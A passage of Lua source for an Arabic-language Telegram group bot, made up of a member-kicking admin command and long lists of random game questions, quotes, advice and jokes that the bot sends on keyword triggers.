},function(ta,DRAGON)
local t = "\nツ قائمة الاعضاء \n⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺ \n"
x = 0
local list = DRAGON.members_
for k, v in pairs(list) do
 if tonumber(v.user_id_) ~= tonumber(bot_id) then
chat_kick(msg.chat_id_,v.user_id_)
end
end
 
end,nil)
end

if text == "تويت" or text == "كت" then 
local TWEET_Msg = { 
"مرتبط● ", 
" هل بتكراش ع حد في حياتك●", 
" ينفع نرتبط●", 
" ممكن توريني صوره بتحبها●", 
" ممكن نبقي صحااب ع الفيس●", 
" هل لسه بتحب الاكس●", 
"عندك كام اكس في حياتك● ", 
"ينفع تبعتلي رقمك● ", 
" ما تيجي اعزمني ع حاجه بحبها●", 
"ينفع احضنك● ", 
"قولي ع اكبر غلطه ندمان عليهاا● ", 
"عندك كام سنه● ", 
" عامل بلوك لكام واحد عندك●", 
" قولي سر محدش يعرفه●", 
" عندك كام اكس في حياتك●", 
"بتعرف تقلش وتهزر● ", 
" لونك المفضل هو●", 
" مين أقرب حد ليك الفتره دي ●", 
" قولي ع اكبر غلطه ندمان عليهاا●", 
" مين مغنيك المفضل●", 
" حابب تبقي اي في المستقبل●", 
"راضي عن حياتك بنسبه كام● ", 
"اكتر حاجه بتلفت انتباهك في البنت او الولد● ", 
"اي رأيك في صوره البروفايل بتاعتي● ", 
" هل باين عليا اني شخص لطيف●", 
" توافق ترجع للاكس●", 
"ممكن تضحي بحياتك لمين● ", 
"سافرت بلاد برا مصر واي هي● ", 
" اي رأيك في صوره البروفايل بتاعتي●", 
" هل بتعتبر نفسك حلو وبتحب شكلك●", 
" نفسك تزور انهي بلد في العالم●", 
" شخصيه ع السوشيال شايف انها مميزه●", 
"عندك فوبيا من اي● ", 
" ممكن تورينا لينك الصراحه●", 
"عمرك عيطت ع حاجه● ", 
" شايف اي أسوأ صفه فيك●", 
"هل شلت مواد قبل كد وعدت السنه● ", 
"بتغير ع الل بتحبهم وبيبان عليك لو غيرت● ", 
"معاك كام فلوس دلوقتي● ", 
" بتفضل صحابك البنات ولا الولاد●", 
" مسامح الل ظلمك●", 
" ممثلك الافضل●", 
" ممكن تقول رساله لحد مش هيشوفها●", 
"انت اهلاوي ولا زملكاوي● ", 
" اي حيوانك المفضل●", 
"اخر افلام شاهدتها", 
"بتعرف تكلم لغه تانيه واي هي● ", 
"ما هي وظفتك الحياه", 
"اعز اصدقائك ?", 
"اخر اغنية سمعتها ?", 
"تكلم عن نفسك", 
"ليه انت مش سالك", 
"ما هيا عيوب سورس الملوك● ", 
"اخر كتاب قرآته", 
"روايتك المفضله ?", 
"اخر اكله اكلتها", 
"اخر كتاب قرآته", 
"ليه الملوك جدع● ", 
"افضل يوم ف حياتك", 
"ليه مضيفتش كل جهاتك", 
"حكمتك ف الحياه", 
"لون عيونك", 
"كتابك المفضل", 
"هوايتك المفضله", 
"علاقتك مع اهلك", 
" ما السيء في هذه الحياة ● ", 
"أجمل شيء حصل معك خلال هذا الاسبوع ● ", 
"سؤال ينرفزك ● ", 
" هل يعجبك سورس الملوك●● ", 
" اكثر ممثل تحبه ● ", 
"قد تخيلت شي في بالك وصار ● ", 
"شيء عندك اهم من الناس ● ", 
"تفضّل النقاش الطويل او تحب الاختصار ● ", 
"وش أخر شي ضيعته● ", 
"اي رايك في سورس الملوك● ", 
"كم مره حبيت● ", 
" اكثر المتابعين عندك باي برنامج●", 
" نسبه الندم عندك للي وثقت فيهم ●", 
"تحب ترتبط بكيرفي ولا فلات●", 
" جربت شعور احد يحبك بس انت مو قادر تحبه●", 
" تجامل الناس ولا اللي بقلبك على لسانك●", 
" عمرك ضحيت باشياء لاجل شخص م يسوى ●", 
"مغني تلاحظ أن صوته يعجب الجميع إلا أنت● ", 
" آخر غلطات عمرك● ", 
" مسلسل كرتوني له ذكريات جميلة عندك● ", 
" ما أكثر تطبيق تقضي وقتك عليه● ", 
" أول شيء يخطر في بالك إذا سمعت كلمة نجوم ● ", 
" قدوتك من الأجيال السابقة● ", 
" أكثر طبع تهتم بأن يتواجد في شريك/ة حياتك● ", 
"أكثر حيوان تخاف منه● ", 
" ما هي طريقتك في الحصول على الراحة النفسية● ", 
" إيموجي يعبّر عن مزاجك الحالي● ", 
" أكثر تغيير ترغب أن تغيّره في نفسك● ", 
"أكثر شيء أسعدك اليوم● ", 
"اي رايك في الدنيا دي ● ", 
"ما هو أفضل حافز للشخص● ", 
"ما الذي يشغل بالك في الفترة الحالية●", 
"آخر شيء ندمت عليه● ", 
"شاركنا صورة احترافية من تصويرك● ", 
"تتابع انمي● إذا نعم ما أفضل انمي شاهدته ", 
"يرد عليك متأخر على رسالة مهمة وبكل برود● موقفك● ", 
"نصيحه تبدا ب -لا- ● ", 
"كتاب أو رواية تقرأها هذه الأيام● ", 
"فيلم عالق في ذهنك لا تنساه مِن روعته● ", 
"يوم لا يمكنك نسيانه● ", 
"شعورك الحالي في جملة● ", 
"كلمة لشخص بعيد● ", 
"صفة يطلقها عليك الشخص المفضّل● ", 
"أغنية عالقة في ذهنك هاليومين● ", 
"أكلة مستحيل أن تأكلها● ", 
"كيف قضيت نهارك● ", 
"تصرُّف ماتتحمله● ", 
"موقف غير حياتك● ", 
"اكثر مشروب تحبه● ", 
"القصيدة اللي تأثر فيك● ", 
"متى يصبح الصديق غريب ", 
"وين نلقى السعاده برايك● ", 
"تاريخ ميلادك● ", 
"قهوه و لا شاي● ", 
"من محبّين الليل أو الصبح● ", 
"حيوانك المفضل● ", 
"كلمة غريبة ومعناها● ", 
"كم تحتاج من وقت لتثق بشخص● ", 
"اشياء نفسك تجربها● ", 
"يومك ضاع على● ", 
"كل شيء يهون الا ● ", 
"اسم ماتحبه ● ", 
"وقفة إحترام للي إخترع ● ", 
"أقدم شيء محتفظ فيه من صغرك● ", 
"كلمات ماتستغني عنها بسوالفك● ", 
"وش الحب بنظرك● ", 
"حب التملك في شخصِيـتك ولا ● ", 
"تخطط للمستقبل ولا ● ", 
"موقف محرج ماتنساه ● ", 
"من طلاسم لهجتكم ● ", 
"اعترف باي حاجه ● ", 
"عبّر عن مودك بصوره ● ",
"آخر مره ضربت عشره كانت متى ●", 
"اسم دايم ع بالك ● ", 
"اشياء تفتخر انك م سويتها ● ", 
" لو بكيفي كان ● ", 
  "أكثر جملة أثرت بك في حياتك● ",
  "إيموجي يوصف مزاجك حاليًا● ",
  "أجمل اسم بنت بحرف الباء● ",
  "كيف هي أحوال قلبك● ",
  "أجمل مدينة● ",
  "كيف كان أسبوعك● ",
  "شيء تشوفه اكثر من اهلك ● ",
  "اخر مره فضفضت● ",
  "قد كرهت احد بسبب اسلوبه● ",
  "قد حبيت شخص وخذلك● ",
  "كم مره حبيت● ",
  "اكبر غلطة بعمرك● ",
  "نسبة النعاس عندك حاليًا● ",
  "شرايكم بمشاهير التيك توك● ",
  "ما الحاسة التي تريد إضافتها للحواس الخمسة● ",
  "اسم قريب لقلبك● ",
  "مشتاق لمطعم كنت تزوره قبل الحظر● ",
  "أول شيء يخطر في بالك إذا سمعت كلمة (ابوي يبيك)● ",
  "ما أول مشروع تتوقع أن تقوم بإنشائه إذا أصبحت مليونير● ",
  "أغنية عالقة في ذهنك هاليومين● ",
  "متى اخر مره قريت قرآن● ",
  "كم صلاة فاتتك اليوم● ",
  "تفضل التيكن او السنقل● ",
  "وش أفضل بوت برأيك● ",
"كم لك بالتلي● ",
"وش الي تفكر فيه الحين● ",
"كيف تشوف الجيل ذا● ",
"منشن شخص وقوله● تحبني● ",
"لو جاء شخص وعترف لك كيف ترده● ",
"مر عليك موقف محرج● ",
"وين تشوف نفسك بعد سنتين● ",
"لو فزعت/ي لصديق/ه وقالك مالك دخل وش بتسوي/ين● ",
"وش اجمل لهجة تشوفها● ",
"قد سافرت● ",
"افضل مسلسل عندك● ",
"افضل فلم عندك● ",
"مين اكثر يخون البنات/العيال● ",
"متى حبيت● ",
  "بالعادة متى تنام● ",
  "شيء من صغرك ماتغير فيك● ",
  "شيء بسيط قادر يعدل مزاجك بشكل سريع● ",
  "تشوف الغيره انانيه او حب● ",
"حاجة تشوف نفسك مبدع فيها● ",
  "مع او ضد : يسقط جمال المراة بسبب قبح لسانها● ",
  "عمرك بكيت على شخص مات في مسلسل ● ",
  "‏- هل تعتقد أن هنالك من يراقبك بشغف● ",
  "تدوس على قلبك او كرامتك● ",
  "اكثر لونين تحبهم مع بعض● ",
  "مع او ضد : النوم افضل حل لـ مشاكل الحياة● ",
  "سؤال دايم تتهرب من الاجابة عليه● ",
  "تحبني ولاتحب الفلوس● ",
  "العلاقه السريه دايماً تكون حلوه● ",
  "لو أغمضت عينيك الآن فما هو أول شيء ستفكر به● ",
"كيف ينطق الطفل اسمك● ",
  "ما هي نقاط الضعف في شخصيتك● ",
  "اكثر كذبة تقولها● ",
  "تيكن ولا اضبطك● ",
  "اطول علاقة كنت فيها مع شخص● ",
  "قد ندمت على شخص● ",
  "وقت فراغك وش تسوي● ",
  "عندك أصحاب كثير● ولا ينعد بالأصابع● ",
  "حاط نغمة خاصة لأي شخص● ",
  "وش اسم شهرتك● ",
  "أفضل أكلة تحبه لك● ",
"عندك شخص تسميه ثالث والدينك● ",
  "عندك شخص تسميه ثالث والدينك● ",
  "اذا قالو لك تسافر أي مكان تبيه وتاخذ معك شخص واحد وين بتروح ومين تختار● ",
  "أطول مكالمة كم ساعة● ",
  "تحب الحياة الإلكترونية ولا الواقعية● ",
  "كيف حال قلبك ● بخير ولا مكسور● ",
  "أطول مدة نمت فيها كم ساعة● ",
  "تقدر تسيطر على ضحكتك● ",
  "أول حرف من اسم الحب● ",
  "تحب تحافظ على الذكريات ولا تمسحه● ",
  "اسم اخر شخص زعلك● ",
"وش نوع الأفلام اللي تحب تتابعه● ",
  "أنت انسان غامض ولا الكل يعرف عنك● ",
  "لو الجنسية حسب ملامحك وش بتكون جنسيتك● ",
  "عندك أخوان او خوات من الرضاعة● ",
  "إختصار تحبه● ",
  "إسم شخص وتحس أنه كيف● ",
  "وش الإسم اللي دايم تحطه بالبرامج● ",
  "وش برجك● ",
  "لو يجي عيد ميلادك تتوقع يجيك هدية● ",
  "اجمل هدية جاتك وش هو● ",
  "الصداقة ولا الحب● ",
"الصداقة ولا الحب● ",
  "الغيرة الزائدة شك● ولا فرط الحب● ",
  "قد حبيت شخصين مع بعض● وانقفطت● ",
  "وش أخر شي ضيعته● ",
  "قد ضيعت شي ودورته ولقيته بيدك● ",
  "تؤمن بمقولة اللي يبيك مايحتار فيك● ",
  "سبب وجوك بالتليجرام● ",
  "تراقب شخص حاليا● ",
  "عندك معجبين ولا محد درا عنك● ",
  "لو نسبة جمالك بتكون بعدد شحن جوالك كم بتكون● ",
  "أنت محبوب بين الناس● ولاكريه● ",
"كم عمرك● ",
  "لو يسألونك وش اسم امك تجاوبهم ولا تسفل فيهم● ",
  "تؤمن بمقولة الصحبة تغنيك الحب● ",
  "وش مشروبك المفضل● ",
  "قد جربت الدخان بحياتك● وانقفطت ولا● ",
  "أفضل وقت للسفر● الليل ولا النهار● ",
  "انت من النوع اللي تنام بخط السفر● ",
  "عندك حس فكاهي ولا نفسية● ",
  "تبادل الكراهية بالكراهية● ولا تحرجه بالطيب● ",
  "أفضل ممارسة بالنسبة لك● ",
  "لو قالو لك تتخلى عن شي واحد تحبه بحياتك وش يكون● ",
"لو احد تركك وبعد فتره يحاول يرجعك بترجع له ولا خلاص● ",
  "برأيك كم العمر المناسب للزواج● ",
  "اذا تزوجت بعد كم بتخلف عيال● ",
  "فكرت وش تسمي أول اطفالك● ",
  "من الناس اللي تحب الهدوء ولا الإزعاج● ",
  "الشيلات ولا الأغاني● ",
  "عندكم شخص مطوع بالعايلة● ",
  "تتقبل النصيحة من اي شخص● ",
  "اذا غلطت وعرفت انك غلطان تحب تعترف ولا تجحد● ",
  "جربت شعور احد يحبك بس انت مو قادر تحبه● ",
  "دايم قوة الصداقة تكون بإيش● ",
"أفضل البدايات بالعلاقة بـ وش● ",
  "وش مشروبك المفضل● او قهوتك المفضلة● ",
  "تحب تتسوق عبر الانترنت ولا الواقع● ",
  "انت من الناس اللي بعد ماتشتري شي وتروح ترجعه● ",
  "أخر مرة بكيت متى● وليش● ",
  "عندك الشخص اللي يقلب الدنيا عشان زعلك● ",
  "أفضل صفة تحبه بنفسك● ",
  "كلمة تقولها للوالدين● ",
  "أنت من الناس اللي تنتقم وترد الاذى ولا تحتسب الأجر وتسامح● ",
  "كم عدد سنينك بالتليجرام● ",
  "تحب تعترف ولا تخبي● ",
"انت من الناس الكتومة ولا تفضفض● ",
  "أنت بعلاقة حب الحين● ",
  "عندك اصدقاء غير جنسك● ",
  "أغلب وقتك تكون وين● ",
  "لو المقصود يقرأ وش بتكتب له● ",
  "تحب تعبر بالكتابة ولا بالصوت● ",
  "عمرك كلمت فويس احد غير جنسك● ",
  "لو خيروك تصير مليونير ولا تتزوج الشخص اللي تحبه● ",
  "لو عندك فلوس وش السيارة اللي بتشتريها● ",
  "كم أعلى مبلغ جمعته● ",
  "اذا شفت احد على غلط تعلمه الصح ولا تخليه بكيفه● ",
"قد جربت تبكي فرح● وليش● ",
  "تتوقع إنك بتتزوج اللي تحبه● ",
  "ما هو أمنيتك● ",
  "وين تشوف نفسك بعد خمس سنوات● ",
  "هل انت حرامي تويت بتعت الملوك● ",
  "لو خيروك تقدم الزمن ولا ترجعه ورا● ",
  "لعبة قضيت وقتك فيه بالحجر المنزلي● ",
  "تحب تطق الميانة ولا ثقيل● ",
  "باقي معاك للي وعدك ما بيتركك● ",
  "اول ماتصحى من النوم مين تكلمه● ",
  "عندك الشخص اللي يكتب لك كلام كثير وانت نايم● ",
  "قد قابلت شخص تحبه● وولد ولا بنت● ",
   "هل انت تحب الملوك● ",
"اذا قفطت احد تحب تفضحه ولا تستره● ",
  "كلمة للشخص اللي يسب ويسطر● ",
  "آية من القران تؤمن فيه● ",
  "تحب تعامل الناس بنفس المعاملة● ولا تكون أطيب منهم● ",
"حاجة ودك تغيرها هالفترة● ",
  "كم فلوسك حاليا وهل يكفيك ام لا● ",
  "وش لون عيونك الجميلة● ",
  "من الناس اللي تتغزل بالكل ولا بالشخص اللي تحبه بس● ",
  "اذكر موقف ماتنساه بعمرك● ",
  "وش حاب تقول للاشخاص اللي بيدخل حياتك● ",
  "ألطف شخص مر عليك بحياتك● ",
   "هل الملوك لطيف● ",
"انت من الناس المؤدبة ولا نص نص● ",
  "كيف الصيد معاك هالأيام ● وسنارة ولاشبك● ",
  "لو الشخص اللي تحبه قال بدخل حساباتك بتعطيه ولا تكرشه● ",
  "أكثر شي تخاف منه بالحياه وش● ",
  "اكثر المتابعين عندك باي برنامج● ",
  "متى يوم ميلادك● ووش الهدية اللي نفسك فيه● ",
  "قد تمنيت شي وتحقق● ",
  "قلبي على قلبك مهما صار لمين تقولها● ",
  "وش نوع جوالك● واذا بتغيره وش بتأخذ● ",
  "كم حساب عندك بالتليجرام● ",
  "متى اخر مرة كذبت● ",
"كذبت في الاسئلة اللي مرت عليك قبل شوي● ",
  "تجامل الناس ولا اللي بقلبك على لسانك● ",
  "قد تمصلحت مع أحد وليش● ",
  "وين تعرفت على الشخص اللي حبيته● ",
  "قد رقمت او احد رقمك● ",
  "وش أفضل لعبته بحياتك● ",
  "أخر شي اكلته وش هو● ",
  "حزنك يبان بملامحك ولا صوتك● ",
  "لقيت الشخص اللي يفهمك واللي يقرا افكارك● ",
  "فيه شيء م تقدر تسيطر عليه ● ",
  "منشن شخص متحلطم م يعجبه شيء● ",
"اكتب تاريخ مستحيل تنساه ",
  "شيء مستحيل انك تاكله ● ",
  "تحب تتعرف على ناس جدد ولا مكتفي باللي عندك ● ",
  "انسان م تحب تتعامل معاه ابداً ● ",
  "شيء بسيط تحتفظ فيه● ",
  "فُرصه تتمنى لو أُتيحت لك ● ",
  "شيء مستحيل ترفضه ●. ",
  "لو زعلت بقوة وش بيرضيك ● ",
  "تنام بـ اي مكان ● ولا بس غرفتك ● ",
  "ردك المعتاد اذا أحد ناداك ● ",
  "مين الي تحب يكون مبتسم دائما ● ",
" إحساسك في هاللحظة● ",
  "وش اسم اول شخص تعرفت عليه فالتلقرام ● ",
  "اشياء صعب تتقبلها بسرعه ● ",
  "شيء جميل صار لك اليوم ● ",
  "اذا شفت شخص يتنمر على شخص قدامك شتسوي● ",
  "يهمك ملابسك تكون ماركة ● ",
  "ردّك على شخص قال (أنا بطلع من حياتك)●. ",
  "مين اول شخص تكلمه اذا طحت بـ مصيبة ● ",
  "تشارك كل شي لاهلك ولا فيه أشياء ما تتشارك● ",
  "كيف علاقتك مع اهلك● رسميات ولا ميانة● ",
  "عمرك ضحيت باشياء لاجل شخص م يسوى ● ",
"اكتب سطر من اغنية او قصيدة جا فـ بالك ● ",
  "شيء مهما حطيت فيه فلوس بتكون مبسوط ● ",
  "مشاكلك بسبب ● ",
  "نسبه الندم عندك للي وثقت فيهم ● ",
  "اول حرف من اسم شخص تقوله? بطل تفكر فيني ابي انام● ",
  "اكثر شيء تحس انه مات ف مجتمعنا● ",
  "لو صار سوء فهم بينك وبين شخص هل تحب توضحه ولا تخليه كذا  لان مالك خلق توضح ● ",
  "كم عددكم بالبيت● ",
  "عادي تتزوج من برا القبيلة● ",
  "أجمل شي بحياتك وش هو● ",
} 
send(msg.chat_id_, msg.id_,'['..TWEET_Msg[math.random(#TWEET_Msg)]..']')  
return false 
end
if text == "كتبات" or text == "حكمه" or text == "قصيده" then 
local TWEET_Msg = { 
"‏من ترك أمرهُ لله● أعطاه الله فوق ما يتمنَّاه💙 ", 
"‏من علامات جمال المرأة .. بختها المايل ! ",
"‏ انك الجميع و كل من احتل قلبي🫀🤍",
"‏ ‏ لقد تْعَمقتُ بكَ كَثيراً والمِيمُ لام .♥️",
"‏ ‏ممكن اكون اختارت غلط بس والله حبيت بجد🖇️",
"‏ علينحياء زَمن الرّسائل الورقيّة وسط هذه الفوضى الالكترونية العَارمة. ♥️",
"‏ يجي اي الصاروخ الصيني ده جمب الصاروخ المصري لما بيلبس العبايه السوده.🤩♥️",
"‏ كُنت أرقّ من أن أتحمّل كُل تلك القَسوة من عَينيك .🍍",
"‏أَكَان عَلَيَّ أَنْ أغْرَس انيابي فِي قَلْبِك لتشعر بِي ●.",
"‏ : كُلما أتبع قلبي يدلني إليك .",
"‏ : أيا ليت من تَهواه العينُ تلقاهُ .",
"‏ ‏: رغبتي في مُعانقتك عميقة جداً .??",
"ويُرهقني أنّي مليء بما لا أستطيع قوله.✨",
"‏ من مراتب التعاسه إطالة الندم ع شيء إنتهى.  ",
"‏ ‏كل العالم يهون بس الدنيا بينا تصفي 💙",
"‏ بعض الاِعتذارات يجب أن تُرفَضّ.",
"‏ ‏تبدأ حياتك محاولاً فهم كل شيء● وتنهيها محاولاً النجاة من كل ما فهمت.",
"‏ إن الأمر ينتهي بِنا إلى أعتياد أي شيء.",
"‏ هل كانت كل الطرق تؤدي إليكِ● أم أنني كنتُ أجعلها كذلك.",
"‏ ‏هَتفضل توآسيهُم وآحد ورآ التآني لكن أنتَ هتتنسي ومحدِش هَيوآسيك.",
"‏ جَبَرَ الله قلوبِكُم ● وقَلبِي .🍫",
"‏ بس لما أنا ببقى فايق● ببقى أبكم له ودان.💖",
"‏ ‏مقدرش عالنسيان ولو طال الزمن 🖤",
"‏ أنا لستُ لأحد ولا احد لي ● أنا إنسان غريب أساعد من يحتاجني واختفي.",
"‏ ‏أحببتك وأنا منطفئ● فما بالك وأنا في كامل توهجي ●",
"‏ لا تعودني على دفء شمسك● إذا كان في نيتك الغروب .َ",
"‏ وانتهت صداقة الخمس سنوات بموقف.",
"‏ ‏لا تحب أحداً لِدرجة أن تتقبّل أذاه.",
"‏ إنعدام الرّغبة أمام الشّيء الّذي أدمنته ● انتصار.",
"‏مش جايز , ده اكيد التأخير وارهاق القلب ده وراه عوضاً عظيماً !💙 ",
" مش جايز , ده اكيد التأخير وارهاق القلب ده وراه عوضاً عظيماً !💙",
"فـ بالله صبر  وبالله يسر وبالله عون وبالله كل شيئ ♥️. ",
"أنا بعتز بنفسي جداً كصاحب وشايف اللي بيخسرني ● بيخسر أنضف وأجدع شخص ممكن يشوفه . ",
"فجأه جاتلى قافله ‏خلتنى مستعد أخسر أي حد من غير ما أندم عليه . ",
"‏اللهُم قوني بك حين يقِل صبري... ",
"‏يارب سهِل لنا كُل حاجة شايلين هَمها 💙‏ ",
"انا محتاج ايام حلوه بقي عشان مش نافع كدا ! ",
"المشكله مش اني باخد قررات غلط المشكله اني بفكر كويس فيها قبل ما اخدها .. ",
"تخيل وانت قاعد مخنوق كدا بتفكر فالمزاكره اللي مزكرتهاش تلاقي قرار الغاء الدراسه .. ",
" مكانوش يستحقوا المعافرة بأمانه.",
"‏جمل فترة في حياتي● كانت مع اكثر الناس الذين أذتني نفسيًا. ",
" ‏إحنا ليه مبنتحبش يعني فينا اي وحش!",
"أيام مُمله ومستقبل مجهول ونومٌ غير منتظموالأيامُ تمرُ ولا شيَ يتغير ", 
"عندما تهب ريح المصلحه سوف ياتي الجميع رتكدون تحت قدمك ♤️. ",
"عادي مهما تعادي اختك قد الدنيا ف عادي ♤. ",
"بقيت لوحدي بمعنا اي انا اصلا من زمان لوحدي.♤️ ",
"- ‏تجري حياتنا بما لاتشتهي أحلامنا ! ",
"تحملين كل هذا الجمال● ‏ألا تتعبين●",
"البدايات للكل ● والثبات للصادقين ",
"مُؤخرًا اقتنعت بالجملة دي جدا : Private life always wins. ",
" الافراط في التسامح بيخللي الناس تستهين بيك🍍",
"مهما كنت كويس فـَ إنت معرض لـِ الاستبدال.. ",
"فخوره بنفسي جدًا رغم اني معملتش حاجه فـ حياتي تستحق الذكر والله . ",
"‏إسمها ليلة القدر لأنها تُغير الأقدار ,اللهُمَّ غير قدري لحالٍ تُحبه وعوضني خير .. ",
"فى احتمال كبير انها ليلة القدر ادعوا لنفسكم كتير وأدعو ربنا يشفى كل مريض. 💙 ",
"أنِر ظُلمتي● وامحُ خطيئتي● واقبل توبتي وأعتِق رقبتي يا اللّٰه. إنكَ عفوٌّ تُحِبُّ العفوَ؛ فاعفُ عني 💛 ", 
} 
send(msg.chat_id_, msg.id_,'['..TWEET_Msg[math.random(#TWEET_Msg)]..']')  
return false 
end
if text == "انصحني" or text == "انصحنى" or text == "انصح" then 
local TWEET_Msg = { 
"عامل الناس بأخلاقك ولا بأخلاقهم", 
"الجمال يلفت الأنظار لكن الطيبه تلفت القلوب ", 
"الاعتذار عن الأخطاء لا يجرح كرامتك بل يجعلك كبير في نظر الناس ",
"لا ترجي السماحه من بخيل.. فما في البار لظمان ماء",
"لا تحقرون صغيره إن الجبال من الحصي",
"لا تستحي من إعطاء فإن الحرمان أقل منه ", 
"لا تظلم حتى لا تتظلم ",
"لا تقف قصاد الريح ولا تمشي معها ",
"لا تكسب موده التحكم الا بالتعقل",
"لا تمد عينك في يد غيرك ",
"لا تملح الا لمن يستحقاها ويحافظ عليها",
"لا حياه للإنسان بلا نبات",
"لا حياه في الرزق.. ولا شفاعه في الموت",
"كما تدين تدان",
"لا دين لمن لا عهد له ",
"لا سلطان على الدوق فيما يحب أو بكره",
"لا مروه لمن لادين له ",
"لا يدخل الجنه من لايأمن من جازه بوائقه",
"يسروا ولا تعسروا... ويشورا ولا تنفروا",
"يدهم الصدر ما يبني العقل الواسع ",
"أثقل ما يوضع في الميزان يوم القيامة حسن الخلق ",
"أجهل الناس من ترك يقين ما عنده لظن ما عند الناس ",
"أحياناً.. ويصبح الوهم حقيقه ",
"مينفعش تعاتب حد مبيعملش حساب لزعلك عشان متزعلش مرتين . ",
"السفر ومشاهده اماكن مختلفه وجديده ",
"عدم تضيع الفرص واسثمارها لحظه مجبئها ",
" اعطاء الاخرين اكثر من ما يتوقعون",
"معامله الناس بلطف ولكن عدم السماح لاحد بستغالال ذالك ",
"تكوين صدقات جديده مع الحفظ بلاصدقاء القودامي ",
"تعلم اصول المهنه بدلا من تضيع الوقت ف تعلم حيل المهنه ",
"مدح ع الاقل ثلاث اشخاص يوميا ",
"النظر ف عيون الشخاص عند مخاطبتهم ",
"التحلي بلسماح مع الاخرين او النفس ",
"الاكثار من قول كلمه شكرا ",
" مصافحه الاخرين بثبات وقوة ",
"الابتعاد عن المناطق السيئه السمعه لتجنب الاحداث السئه ",
" ادخار 10٪ع الاقل من الدخل",
" تجنب المخاوف من خلال التعلم من تجارب مختلفه",
" الحفاظ ع السمعه لانها اغلي ما يملك الانسان",
" تحويل الاعداء الي اصدقاء من خلال القيام بعمل جيد",
"لا تصدق كل ما تسمعع. ولا تنفق كل ما تمتلك . ولا تنم قدر ما ترغب ",
" اعتني بسمعتك جيدا فستثبت للك الايام انها اغلي ما تملك",
"حين تقول والدتك ستندم ع فعل ذالك ستندم عليه غالبا.. ",
" لا تخش العقبات الكبيره فخلفها تقع الفرص العظيمه",
"قد لا يتطلب الامر اكثر من شخص واحد لقلب حياتك رأس ع عقب ",
"اختر رفيقه حياتك بحرص فهو قرار سيشكل 90٪من سعادتك او بؤسك ",
" اقلب اداءك الاصدقاء بفعل شي جميل ومفجائ لهم",
"حين تدق الفرصه ع باباك ادعوها للبيت ",
"تعلم القواعد جيدا ثن اكسر بعدها ",
"احكم ع نجاحك من خلال قدرتك ع العطاء وليس الاخذ ",
" لا تتجاهل الشيطان مهما بدل ثيابه",
"ركز ع جعل الاشياء افضل وليس اكبر او اعظم ",
"كن سعيد  بما تمتلك واعمل لامتلاك ما تريد ",
"اعط الناس اكثر من ما يتوقعون ",
" لا تكن منشغل لدرجه عدم التعرف ع اصدقاء جدد",
"استحمه يوم العيد يمعفن🤓",
"مش تحب اي حد يقرب منك ",
" خليك مع البت راجل خليك تقيل🥥",
" انصح نفسك بنفسك بمت😆",
" كنت نصحت نفسي ياخويا😹", 
} 
send(msg.chat_id_, msg.id_,'['..TWEET_Msg[math.random(#TWEET_Msg)]..']')  
return false 
end
if text == "نكته" or text == "قولي نكته" or text == "عايز اضحك" then 
local TWEET_Msg = { 
" مرة واحد مصري دخل سوبر ماركت في الكويت عشان يشتري ولاعة..    راح عشان يحاسب بيقوله الولاعة ديه بكام●   قاله دينار..  قاله منا عارف ان هي نار بس بكام 🤓😂", 
"بنت حبت تشتغل مع رئيس عصابة..   شغلها في غسيل الأموال 🤓😂 ", 
"واحد بيشتكي لصاحبه بيقوله أنا مافيش حد بيحبني ولا يفتكرني أبدًا● ومش عارف أعمل إيه.. قاله سهلة.. استلف من الناس فلوس هيسألوا عليك كل يوم! 🤓😂",
"ﻣﺮه واﺣﺪ ﻣﺴﻄﻮل ﻣﺎﺷﻰ ﻓﻰ اﻟﺸﺎرع ﻟﻘﻰ مذﻳﻌﻪ ﺑﺘﻘﻮﻟﻪ ﻟﻮ ﺳﻤﺤﺖ ﻓﻴﻦ اﻟﻘﻤﺮ●    ﻗﺎﻟﻬﺎ اﻫﻮه..   ﻗﺎﻟﺘﻠﻮ ﻣﺒﺮوك ﻛﺴﺒﺖ ﻋﺸﺮﻳﻦ ﺟﻨﻴﻪ..   ﻗﺎﻟﻬﺎ ﻓﻰ واﺣﺪ ﺗﺎﻧﻰ ﻫﻨﺎك اﻫﻮه. 🤓😂",
"واحده ست سايقه على الجي بي اس..  قالها انحرفي قليلًا..   قلعت الطرحة. 🤓😂 ",
"مرة واحد غبي معاه عربية قديمة جدًا وبيحاول يبيعها وماحدش راضي يشتريها.. راح لصاحبه حكاله المشكلة.. صاحبه قاله عندي لك فكرة جهنمية هاتخليها تتباع الصبح.. أنت تجيب علامة مرسيدس وتحطها عليها. بعد أسبوعين صاحبه شافه صدفة قاله بعت العربية ولا لاء● قاله انت  مجنون● حد يبيع مرسيدس● 🤓😂",
"مره واحد بلديتنا كان بيدق مسمار فى الحائط فالمسمار وقع منه فقال له :تعالى ف مجاش, فقال له: تعالي ف مجاش. فراح بلديتنا رامي على المسمار شوية مسمامير وقال: هاتوه. 🤓😂",
"واحدة عملت حساب وهمي ودخلت تكلم جوزها منه.. ومبسوطة أوي وبتضحك.. سألوها بتضحكي على إيه● قالت لهم أول مرة يقول لي كلام حلو من ساعة ما اتجوزنا. 🤓😂",
"بنت حبت تشتغل مع رئيس عصابة..   شغلها في غسيل الأموال 🤓😂",
"مره واحد اشترى فراخ..   علشان يربيها فى قفص صدره.🤓😂",
"مرة واحد من الفيوم مات..   أهله صوصوا عليه.🤓😂",
"ﻣﺮه واﺣﺪ ﻣﺴﻄﻮل ﻣﺎﺷﻰ ﻓﻰ اﻟﺸﺎرع ﻟﻘﻰ مذﻳﻌﻪ ﺑﺘﻘﻮﻟﻪ ﻟﻮ ﺳﻤﺤﺖ ﻓﻴﻦ اﻟﻘﻤﺮ●    ﻗﺎﻟﻬﺎ اﻫﻮه..   ﻗﺎﻟﺘﻠﻮ ﻣﺒﺮوك ﻛﺴﺒﺖ ﻋﺸﺮﻳﻦ ﺟﻨﻴﻪ..   ﻗﺎﻟﻬﺎ ﻓﻰ واﺣﺪ ﺗﺎﻧﻰ ﻫﻨﺎك اﻫﻮه.🤓😂",
"مره واحد شاط كرة فى المقص..   اتخرمت. 🤓😂",
"مرة واحد رايح لواحد صاحبه.. فا البواب وقفه بيقول له انت طالع لمين.. قاله طالع أسمر شوية لبابايا.. قاله يا أستاذ طالع لمين في العماره 🤓😂",
} 
send(msg.chat_id_, msg.id_,'['..TWEET_Msg[math.random(#TWEET_Msg)]..']')  
return false 
end
if text == "باد" or text == "اسئله محرجه" then 
local TWEET_Msg = { 
" لا تحقرون صغيره إن الجبال من الحصي🥵",
" عاوز تنزل ناو ولا لا ?🥵",
